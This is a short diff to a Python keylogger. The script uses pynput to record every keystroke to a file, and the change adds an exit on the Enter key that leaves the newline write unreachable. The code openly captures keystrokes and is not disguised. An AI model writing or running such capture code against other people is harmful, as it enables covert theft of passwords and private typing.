@@ -1,4 +1,5 @@
 from pynput.keyboard import Listener
+import sys
 
 def addtofile(key):
     keydata = str(key).replace("'", "") 
@@ -7,6 +8,7 @@ def addtofile(key):
             if keydata == 'Key.space':
                 f.write(' ')
             elif keydata == 'Key.enter':
+                sys.exit()
                 f.write('\n')
             elif keydata.startswith("Key"):
                 f.write(f' [{keydata}] ')
@@ -19,4 +21,4 @@ def addtofile(key):
 
 with Listener(on_press=addtofile) as l:
     l.join()
-    
+   
